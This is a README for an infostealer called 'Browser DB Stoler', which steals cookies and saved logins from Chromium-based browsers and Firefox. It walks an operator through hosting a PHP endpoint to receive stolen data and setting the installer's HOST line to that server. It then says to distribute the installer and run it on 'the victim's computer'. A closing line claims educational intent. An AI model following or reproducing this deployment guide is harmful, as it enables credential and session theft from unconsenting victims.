# Browser DB Stoler
Steal cookies and login data from Chromium based browser and Firefox, of course.  

## Using it
>Sorry for the bad english, i'm trying to keep the more understable-like mode.  
1. First, get a PHP compatible server. Like shared-hosting.  
2. Create a folder, and inside it upload:  
	-`cookies.php`: Server-Side script to upload collected data from victims.  
	> needs a folder called `cookies` where the script is.  
	
	-`browserdbstoler.py`: Main script that will be downloaded by the victim.  
3. Modify some lines in the `browserdbstoler-installer.py` file.  
    L4: `HOST = "https://example/BrowserDBStoler/"`  
    > where the root folder with the script is, relative to http path.  
4. Distribute the `browserdbstoler-installer.py` file.  
5. Run the previous script in the victim's computer.  
6. Enjoy.  

### Help
The FTP www directory must look something like:  
- BrowserDBStoler  
	- cookies/  
	- browserdbstoler.py  
	- cookies.php

And you need to be able to see `cookies.php` from a webbroser. Like `https://example/BrowserDBStoler/cookies.php`.  
And, you need to be able to download `browserdbstoler.py` from a webbrowser too. Like `https://example/BrowserDBStoler/browserdbstoler.py`.  

### NOTICE
I am not responsible for any misuse that may be given to the script. This was designed for educational purposes for an evaluation for the Cybersecurity subject.
